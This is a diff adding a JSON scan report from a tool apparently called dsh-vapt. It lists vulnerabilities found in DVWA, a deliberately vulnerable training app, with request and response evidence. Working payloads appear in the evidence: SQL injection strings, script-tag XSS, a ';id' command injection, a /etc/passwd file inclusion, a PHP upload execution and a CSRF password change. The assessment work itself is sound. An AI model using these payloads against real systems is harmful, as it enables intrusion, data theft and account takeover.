@@ -1,0 +1,135 @@
+{
+  "tool": "dsh-vapt",
+  "app": "dvwa",
+  "appsRun": [
+    "dvwa"
+  ],
+  "observations": [
+    {
+      "itemId": "DV-01",
+      "app": "dvwa",
+      "path": "/vulnerabilities/sqli/",
+      "param": "id",
+      "title": "SQL injection on /vulnerabilities/sqli (id)",
+      "severity": "critical",
+      "evidence": {
+        "request": "GET /vulnerabilities/sqli/?id=1' HTTP/1.1",
+        "response": "<pre>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1</pre>",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "DV-02",
+      "app": "dvwa",
+      "path": "/vulnerabilities/xss_r/",
+      "param": "name",
+      "title": "Reflected XSS on /vulnerabilities/xss_r (name)",
+      "severity": "high",
+      "evidence": {
+        "request": "GET /vulnerabilities/xss_r/?name=<script>alert(1)</script> HTTP/1.1",
+        "response": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<t",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "DV-03",
+      "app": "dvwa",
+      "path": "/vulnerabilities/exec/",
+      "param": "ip",
+      "title": "OS command injection on /vulnerabilities/exec (ip)",
+      "severity": "critical",
+      "evidence": {
+        "request": "POST /vulnerabilities/exec/ ip=127.0.0.1;id",
+        "response": "uid=33(www-data)",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "DV-04",
+      "app": "dvwa",
+      "path": "/vulnerabilities/fi/",
+      "param": "page",
+      "title": "Local file inclusion on /vulnerabilities/fi (page)",
+      "severity": "high",
+      "evidence": {
+        "request": "GET /vulnerabilities/fi/?page=/etc/passwd HTTP/1.1",
+        "response": "root:x:0:0:root:/root:/bin/bash",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "DV-06",
+      "app": "dvwa",
+      "path": "/vulnerabilities/xss_s/",
+      "title": "Stored XSS via guestbook (xss_s)",
+      "severity": "high",
+      "evidence": {
+        "request": "POST /vulnerabilities/xss_s/ mtxMessage=<script>alert(2)</script>",
+        "response": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-T",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "DV-07",
+      "app": "dvwa",
+      "path": "/vulnerabilities/upload/",
+      "title": "Unrestricted file upload leads to PHP execution",
+      "severity": "critical",
+      "evidence": {
+        "request": "POST /vulnerabilities/upload/ (bench.php)",
+        "response": "path=hackable/uploads/bench.php executed=true",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "DV-08",
+      "app": "dvwa",
+      "path": "/vulnerabilities/csrf/",
+      "title": "CSRF: password change without any token",
+      "severity": "high",
+      "evidence": {
+        "request": "GET /vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change",
+        "response": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "DV-09",
+      "app": "dvwa",
+      "path": "/vulnerabilities/sqli_blind/",
+      "param": "id",
+      "title": "Blind SQL injection (boolean differential) on /vulnerabilities/sqli_blind",
+      "severity": "high",
+      "evidence": {
+        "request": "GET /vulnerabilities/sqli_blind/?id=1' AND 1=2# HTTP/1.1",
+        "response": "User ID exists in the database.",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "DV-10",
+      "app": "dvwa",
+      "path": "/vulnerabilities/xss_d/",
+      "param": "default",
+      "title": "DOM XSS on /vulnerabilities/xss_d (default param reaches document.write)",
+      "severity": "high",
+      "evidence": {
+        "request": "GET /vulnerabilities/xss_d/?default=<payload> HTTP/1.1",
+        "response": "document.write(\"<option value='\" + lang + \"'>\" + decodeURI(lang) + \"</option>\")",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "DV-05",
+      "app": "dvwa",
+      "path": "/setup.php",
+      "title": "Installer /setup.php left reachable after install",
+      "severity": "medium",
+      "evidence": {
+        "request": "GET /setup.php HTTP/1.1",
+        "response": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-T",
+        "sha256": "recorded-by-store"
+      }
+    }
+  ]
+}
